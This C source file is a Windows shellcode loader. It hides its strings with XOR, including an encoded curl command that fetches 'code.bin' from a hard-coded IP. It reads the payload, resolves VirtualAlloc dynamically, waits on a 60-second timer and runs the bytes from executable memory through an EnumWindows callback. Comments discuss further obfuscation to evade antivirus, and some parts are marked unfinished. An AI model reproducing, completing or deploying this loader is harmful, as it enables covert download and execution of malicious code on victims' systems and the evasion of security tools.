#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

VOID CALLBACK TimerProc(HWND hWnd, UINT message, UINT_PTR timerId, DWORD dwTime);
LPVOID (WINAPI * pAllocate) (LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
LPCSTR de_xor(unsigned char *payload, signed int payloadSize, unsigned char key);

typedef struct 
{
	unsigned char * payload;
	int payloadSize;
	unsigned char key;
} TimerContext;

TimerContext g_context;

int main(void)
{

	unsigned key = 's';
	// Further encrypt this shellcode (see if AV still identifies its as a )
	unsigned char procName[] = "\x25\x1a\x01\x07\x06\x12\x1f\x32\x1f\x1f\x1c\x10\x73";
	unsigned char kernel[] = "\x18\x16\x01\x1d\x16\x1f\x40\x41\x5d\x17\x1f\x1f\x73";
	// Pointer to command
	// XOR this command to prevent identification of command and control ip
	char * command = "\x10\x06\x01\x1f\x53\x1b\x07\x07\x03\x49\x5c\x5c\x42\x4a\x41\x5d\x42\x45\x4b\x5d\x43\x5d\x42\x40\x47\x5c\x10\x1c\x17\x16\x5d\x11\x1a\x1d\x73";
	// Buffer to store the shellcode piped from command.
	unsigned char shellcode[460];
	// Buffer to store one byte piped from command to shellcode buffer
	char byte = 0;
	int counter = 0;
	// File storage of shellcode
	FILE * fpipe;

	// Check to see if results of command have failed to be piped to file storage
	// STILL NEED TO IMPLEMENT DE_XOR TO DECRYPT COMMAND 
	// ALso encapsulate this in the timer callback function otherwise it just has payload sitting until timer executes
	if(NULL == (fpipe = (FILE *)popen(command, "r")))
	{
		printf("Failed to pipe!");
		return 1;
	}
	
	while (fread(&byte, sizeof(byte), 1, fpipe))
	{
		shellcode[counter] = byte;
		counter += 1;
	}
	// Closes handle to the file pointer
	fclose(fpipe);
	
	g_context.key = key;
	g_context.payload = shellcode;
	g_context.payloadSize = sizeof(shellcode);
	pAllocate = (LPVOID(WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(GetModuleHandle(de_xor(kernel, sizeof(kernel), key)), de_xor(procName, sizeof(procName), key));


	UINT_PTR timerId = SetTimer(NULL, 1, 60000, TimerProc);

	MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
	KillTimer(NULL, timerId);
		
	return 0;
}

VOID CALLBACK TimerProc(HWND hWnd, UINT message, UINT_PTR timerId, DWORD dwTime)
{
	// for (int i = 0; i < g_context.payloadSize - 1; i++)
	// {
	// 	g_context.payload[i] = g_context.payload[i]^g_context.key;
	// }
	// Encrypt DLL and function strings. 
	// Obfuscate function calls - using DLL pointer.
    void * payload_mem = pAllocate(NULL, g_context.payloadSize , MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(payload_mem, g_context.payload, g_context.payloadSize);
    EnumWindows((WNDENUMPROC) payload_mem, (LPARAM) NULL);
};

LPCSTR de_xor(unsigned char *payload, signed int payloadSize, unsigned char key)
{
	for (int i = 0; i < payloadSize; i++)
	{
		payload[i] = payload[i]^key;
	}
	return (LPCSTR)payload;
}




